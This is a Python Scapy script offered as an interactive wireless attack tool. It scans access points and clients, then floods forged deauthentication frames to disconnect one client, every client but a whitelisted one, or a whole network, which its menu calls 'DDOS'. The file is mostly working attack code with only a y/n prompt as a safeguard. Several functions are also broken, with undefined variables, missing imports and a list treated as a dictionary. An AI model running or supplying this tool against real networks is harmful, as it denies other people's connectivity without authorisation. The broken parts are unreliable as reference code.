from scapy.all import *
import subprocess
import random


def SetMonitorMode(interf):

	print("Setting interface {} to monitor mode...".format(interf))
	try:
		subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"])
		subprocess.run(["sudo", "ifconfig", interf, "down"])
		subprocess.run(["sudo", "iwconfig", interf, "mode", "monitor"])
		subprocess.run(["sudo", "ifconfig", interf, "up"])
	except Exception as e:
		print(e)
		return -1
	print("Interface {} has been successfully set to monitor mode".format(interf))
	return 0

def SetManagedMode(interf):

	print("Setting interface {} to managed mode...".format(interf))
	try:
		subprocess.run(["sudo", "ifconfig", interf, "down"])
		subprocess.run(["sudo", "iwconfig", interf, "mode", "managed"])
		subprocess.run(["sudo", "ifconfig", interf, "up"])
		subprocess.run(["sudo", "systemctl", "start", "NetworkManager.service"])
	except Exception as e:
		print(e)
		return -1
	
	print("Interface {} has been successfully set to managed mode".format(interf))
	return 0

def scan_interfaces(): 
    try:
        interfaces = os.listdir('/sys/class/net')
        interfaces.remove("lo")
        if len(interfaces) > 0:
        	return interfaces
        else:
        	print("No interface found")
    except Exception as e:
        print("Error:",e)
        return None

def Help():
	print("""Usage: [Command] [Specification] [Value]

Comands: 
	Clients <BSSID> - scans traffic of provided BSSID, returns list of connected clients
	DDOS <BSSID> - deauths whole wireless network
	Deauth [mac_address] <BSSID> - deauths given mac address
	Exit - exits the program
	GenTraf [BSSID] - sneaky way to generate traffic on chosen network
	Prio [whitelisted MAC] - deauths all clients except whitelisted mac
	Scan - Looks for available AP in proximity
	Set [Specification] [Value] - sets specification to value
	Stat - shows set variables
	------------------------------------------------------------------
	[] - necessary
	<> - optional
	------------------------------------------------------------------""") 

def Scan(interf, time_of_attack):
	aps = {}
	def AP_scan(packet):
		if packet.haslayer(Dot11):
			if packet.type == 0 and packet.subtype == 8:
					if packet.addr3 not in aps:
						aps[packet.addr3] = packet.info.decode('utf-8')
	print("Scanning...")
	sniff(iface=interf, prn=AP_scan, store=0, timeout=time_of_attack)
	print("BSSID             ; ESSID")
	for mac, ssid in aps.items():
		print("{} ; {}".format(mac, ssid))

	return aps
		
def Deauth_client(interf, target_mac, gateway_mac, SSID, time_of_attack):
	deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2=target_mac,addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))
	if SSID != " ":
		last_check = input("Are you sure to deauth {} from {} ({})? [y/n] ".format(target_mac, gateway_mac, SSID))
	else:
		last_check = input("Are you sure to deauth {} from {} ? [y/n] ".format(target_mac, gateway_mac))
	if last_check == "y":
		print("Deauthing {} from {} ({})".format(target_mac, SSID, gateway_mac))
		counter = time.time()
		while (time.time()-counter) < time_of_attack:
			for i in range(64):
				sendp(deauth_client, iface="{}".format(interf), verbose=0)
			print(".", end="")
			time.sleep(random.randint(5,10)/10)
		print()

	else:
		print("Exitting!")


def Scan_clients(interf, gateway_mac, time_of_attack):
	clients = []
	def handle_packets(packet):
		if packet.haslayer(Dot11):
			if packet.type != 0 and packet.subtype != 8:
				if packet.addr2 == gateway_mac:
					if packet.addr1 not in clients and packet.addr1 != "ff:ff:ff:ff:ff:ff" and packet.addr1 != None:
						clients.append(packet.addr1)
				elif packet.addr1 == gateway_mac:
					if packet.addr2 not in clients and packet.addr2 != "ff:ff:ff:ff:ff:ff"and packet.addr2 != None:
						clients.append(packet.addr2)


	sniff(iface=interf, prn=handle_packets, store=0, timeout=time_of_attack)
	return clients

def Prio_deauth(interf, gateway_mac, SSID, whitelisted_mac, time_of_attack):
	print("Deauthing everyone from {} ({}) except {}".format(SSID, gateway_mac, whitelisted_mac))
	k = time.time()
	clients = Scan_clients(interf, gateway_mac, time_of_attack)
	while (time.time()-k) < time_of_attack :
		for client, ssid in clients.items():
			if clients != whitelisted_mac:
				deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2=client,addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))
				for i in range(16):
					send(deauth_client)
		time.sleep(random.randint(2,6)/10)
			
def Gen_traf(interf, gateway_mac, ESSID, time_of_attack):
	print("Generating traffic on {} ({})".format(ESSID, gateway_mac))
	k = time.time()
	clients = Scan_clients(interf, gateway_mac, time_of_attack)
	while (time.time()-k) < time_of_attack :
		for client, ssid in clients.items():
			if clients != whitelisted_mac:
				deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2=client,addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))
				for i in range(3):
					send(deauth_client)
			time.sleep(random.randint(2,6)/10)
		time.sleep(random.randint(2,6))

def Vuln(interf): 
	clients = []
	def handler(packet): 
		if packet.haslayer(Dot11):
			if packet.type == 0 and (packet.subtype == 10 or packet.subtype == 12):
				if REWORK == 1 and [packet.addr2, 1] not in clients:
					clients.append([packet.addr2, 1])
				elif [packet.addr2, 0] not in clients:
					clients.append([packet.addr2, 0])
	sniff(interf, timeout=10)
	if clients:
		for cl in clients:
			print(cl[0], cl[1]) # EXPERIMENTAL

def Select_interface():
	ifcaces = scan_interfaces()
	if ifaces:
		print("Please select one wireless interface: ")
		print(ifaces)
		usr_inp = input()
		return usr_inp
	else:
		print("No interfaces found!")
		print("Selecting default interface: {}".format(conf.iface))
		return conf.iface

def DDOS(interf, gateway_mac, SSID, time_of_attack):
	deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2="ff:ff:ff:ff:ff:ff",addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))
	if SSID != " ":
		last_check = input("Are you sure to deauth {} ({})? [y/n] ".format( gateway_mac, SSID))
	else:
		last_check = input("Are you sure to deauth {} ? [y/n] ".format(gateway_mac))
	if last_check == "y":
		print("Deauthing {} ({})".format(SSID, gateway_mac))
		counter = time.time()
		while (time.time()-counter) < time_of_attack:
			for i in range(64):
				sendp(deauth_client, iface="{}".format(interf), verbose=0)
			print(".", end="")
			time.sleep(random.randint(5,10)/10)
		print()
		
	else:
		print("Exitting!")
		

def main():
	if __name__ != "__main__":
		return -1

	user_input = " "
	selected_gateway = " "
	selected_SSID = " "
	time_of_attack = 3
	duos_ssid_bssid = {}
	clients = []

	string_gateways = ["Gateway", "gateway", "gtw", "Gtw"]
	string_interfaces = ["Interface", "interface", "interf", "int"]
	string_exits = ["exit", "Exit", "ext"]
	string_sets = ["Set", "set", "st"]
	string_times = ["Time", "time", "t"]
	string_scans = ["Scan", "scan", "scn", "sc"]
	string_deauth = ["deauth", "Deauth", "deau", "de"]
	string_DDOS = ["DDOS", "ddos", "dd", "DD"]
	string_prio = ["Prio", "prio", "Priority", "priority"]
	string_clients = ["Clients", "clients", "client", "Client", "cl"]
	string_gens = ["GenTraf", "gentraf", "gen", "Gen", "traf", "Traf"]
	string_stats = ["Stat", "stat", "stats", "Stats", "st", "St"]
	
	selected_interface = Select_interface()
	if selected_interface == "":
		print(conf.iface)
		selected_interface = str(conf.iface)
	SetMonitorMode(selected_interface)

	while user_input[0] not in string_exits:
		
		if user_input[0] in string_sets: # SET
			if len(user_input) > 2:
				if user_input[1] in string_gateways:
					selected_gateway = user_input[2]
					selected_SSID = duos_ssid_bssid[selected_gateway]
					print("Target gateway set to {}".format(selected_gateway))
				elif user_input[1] in string_interfaces:
					if selected_interface != user_input:
						SetManagedMode(selected_interface)
						selected_interface = user_input[2]
						SetMonitorMode(selected_interface)
					print("Interface set to {}".format(selected_interface))
				elif user_input[1] in string_times:
					time_of_attack = int(user_input[2])
					print("Time of attack set to {} s".format(time_of_attack))
				else:
					Help()

		elif user_input[0] in string_scans: # SCAN
			duos_ssid_bssid =  Scan(selected_interface, time_of_attack)

		elif user_input[0] in string_deauth: # DEAUTH
			if len(user_input) > 1:
				Deauth_client(selected_interface, user_input[1], selected_gateway, duos_ssid_bssid[selected_gateway], time_of_attack)

		elif user_input[0] in string_prio: # PRIO
			if len(user_input) < 2:
				Prio_deauth(selected_interface, selected_gateway, selected_SSID , input("Please provide mac address to be prioritized: "), time_of_attack)
			elif len(user_input) == 2:
				Prio_deauth(selected_interface, selected_gateway, selected_SSID, user_input[1], time_of_attack)

		
		elif user_input[0] in string_clients: # CLIENTS
			if len(user_input) < 2 and selected_gateway == " ":
				tmp = input("Select target gateway: ")
				clients = Scan_clients(selected_interface, tmp, time_of_attack)
				selected_gateway = tmp
				if not clients:
					print("No clients detected!")
					print("Trying one more time...")
					clients = Scan_clients(selected_interface, tmp, time_of_attack)
				else:
					print("{} clients detected".format(len(clients)))
					for cl in clients:
						print(cl)
					
			elif len(user_input) < 2:
				clients = Scan_clients(selected_interface, selected_gateway, time_of_attack)
				if not clients:
					print("No clients detected!")
					print("Trying one more time...")
					clients = Scan_clients(selected_interface, selected_gateway, time_of_attack)
				else:
					print("{} clients detected".format(len(clients)))
					for cl in clients:
						print(cl)
					
			else:	
				clients = Scan_clients(selected_interface, user_input[1], time_of_attack)
				selected_gateway = user_input[1]
				if not clients:
					print("No clients detected!")
					print("Trying one more time...")
					clients = Scan_clients(selected_interface, user_input[1], time_of_attack)

				else:
					print("{} clients detected".format(len(clients)))
					for cl in clients:
						print(cl)
					
		
		elif user_input[0] in string_stats: # STATS
			print("Selected Interface: {}".format(selected_interface))
			print("Selected Gateway: {}". format(selected_gateway))
			print("SSID: {}".format(selected_SSID))
			print("Time of attack: {}".format(time_of_attack))
			
			print("Access Points:")
			for key, value in duos_ssid_bssid.items():
				print(f'{value}({key})')

			print("Detected clients:")
			for client in clients:
				print(client)
		elif user_input[0] in string_gens: # GENERATE
			if len(user_input) < 3 and selected_gateway == " ":
				tmp = input("Select target gateway: ")
				Gen_traf(selected_interface, tmp, duos_ssid_bssid[tmp], time_of_attack)
			else:
				Gen_traf(selected_interface, selected_gateway, selected_SSID, time_of_attack)
		elif user_input[0] in string_DDOS: # DDOS
			if len(user_input) < 2 and selected_gateway == " ":
				tmp = input("Select target gateway: ")
				DDOS(selected_interface, tmp, duos_ssid_bssid[tmp], time_of_attack)
			else:
				DDOS(selected_interface, selected_gateway, selected_SSID, time_of_attack)

		else:
			Help()
		
		print()
		user_input = input("-> ").split(' ')

	SetManagedMode(selected_interface)

main() 